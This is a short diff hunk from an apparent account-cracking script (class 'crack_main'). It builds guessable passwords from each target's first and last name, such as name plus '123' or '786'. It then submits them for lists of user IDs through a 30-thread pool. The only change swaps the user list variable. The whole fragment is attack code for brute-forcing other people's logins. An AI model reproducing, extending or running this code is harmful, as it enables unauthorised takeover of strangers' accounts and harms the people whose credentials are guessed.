@@ -427,7 +427,7 @@ class crack_main():
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 with ThreadPool(max_workers=30) as formSubmit:
-                        for user in self.id:
+                        for user in zia:
                                 iid,name = user.split('|')
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
